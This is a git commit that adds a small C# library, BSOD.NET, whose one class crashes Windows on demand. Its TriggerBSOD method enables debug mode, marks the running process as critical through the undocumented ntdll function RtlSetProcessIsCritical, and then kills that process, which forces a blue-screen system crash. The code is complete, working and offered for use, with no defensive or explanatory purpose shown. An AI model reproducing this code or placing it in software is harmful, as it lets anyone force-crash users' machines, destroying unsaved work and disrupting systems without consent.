1d6e950199de7777fa83cf65c0d52ea0ffccda7c
CPPrestiged <55336451+bytespacegames@users.noreply.github.com>
2023-03-19 09:59:22 -0700

    Add project files.

---
+++ BSOD.NET/BSODManager.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace BSOD.NET
+{
+    public class BSODManager
+    {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
+        public static void TriggerBSOD()
+        {
+            Process.EnterDebugMode();
+            RtlSetProcessIsCritical(1, 0, 0);
+            Process.GetCurrentProcess().Kill();
+        }
+    }
+}
